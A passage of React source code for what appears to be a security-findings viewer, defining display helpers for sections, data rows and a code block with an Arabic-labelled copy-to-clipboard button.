            {finding.vuln_class && <span>vuln_class: {finding.vuln_class}</span>}
            {finding.subtype && <span className="ms-3">subtype: {finding.subtype}</span>}
          </div>
        </div>
      </aside>
    </>
  )
}

function Section({ title, children, tone }) {
  const color = tone === "danger" ? "#fca5a5" : tone === "success" ? "#86efac" : "var(--text-primary)"
  return (
    <div>
      <SectionTitle tone={tone}>{title}</SectionTitle>
      <div className="mt-2 text-sm leading-relaxed" style={{ color, whiteSpace: "pre-wrap" }}>{children}</div>
    </div>
  )
}

function SectionTitle({ children, tone }) {
  const color = tone === "danger" ? "#ef4444" : tone === "success" ? "#22c55e" : "var(--accent-yellow)"
  return <div className="text-xs font-bold uppercase tracking-wider" style={{ color }}>{children}</div>
}

function DataRow({ label, value, mono, wrap }) {
  return (
    <div className="flex gap-3 text-xs">
      <div className="w-20 shrink-0 font-bold" style={{ color: "var(--text-muted)" }}>{label}</div>
      <div className="flex-1 min-w-0"
        style={{
          color: "var(--text-primary)",
          fontFamily: mono ? "monospace" : "inherit",
          wordBreak: wrap ? "break-all" : "normal",
          whiteSpace: wrap ? "pre-wrap" : "nowrap",
          overflow: "hidden",
          textOverflow: "ellipsis",
          direction: mono ? "ltr" : "inherit",
          textAlign: mono ? "left" : "inherit",
        }}
        title={value}>
        {value}
      </div>
    </div>
  )
}

function CodeBlock({ title, code, lang }) {
  const [copied, setCopied] = useState(false)
  const copy = async () => {
    try {
      await navigator.clipboard.writeText(code)
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    } catch (e) {
      const ta = document.createElement("textarea")
      ta.value = code
      document.body.appendChild(ta)
      ta.select()
      try { document.execCommand("copy") } catch (_) {}
      document.body.removeChild(ta)
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    }
  }
  return (
    <div className="rounded-lg overflow-hidden" style={{ border: "1px solid var(--border-color)" }}>
      <div className="px-3 py-2 flex items-center justify-between"
        style={{ background: "var(--bg-tertiary)", borderBottom: "1px solid var(--border-color)" }}>
        <div className="text-xs font-bold" style={{ color: "var(--accent-yellow)" }}>{title}</div>
        <div className="flex items-center gap-2">
          <span className="text-[10px] font-mono px-2 py-0.5 rounded uppercase"
            style={{ background: "rgba(6,182,212,0.15)", color: "var(--accent-cyan)" }}>{lang}</span>
          <button onClick={copy}
            className="px-2 py-1 rounded text-[10px] font-bold"
            style={{ background: copied ? "var(--accent-green)" : "var(--accent-cyan)", color: "#000", cursor: "pointer" }}>
            {copied ? "✓ تم النسخ" : "📋 نسخ"}
          </button>
        </div>
      </div>
      <pre className="px-3 py-3 text-[11px] overflow-x-auto"
        style={{
          background: "rgba(0,0,0,0.35)",
          color: "var(--text-primary)",
          fontFamily: "monospace",
          lineHeight: "1.65",
          whiteSpace: "pre",
          direction: "ltr",
          textAlign: "left",
          maxHeight: "420px",
          overflowY: "auto",
        }}>
{code}
      </pre>
    </div>
  )
}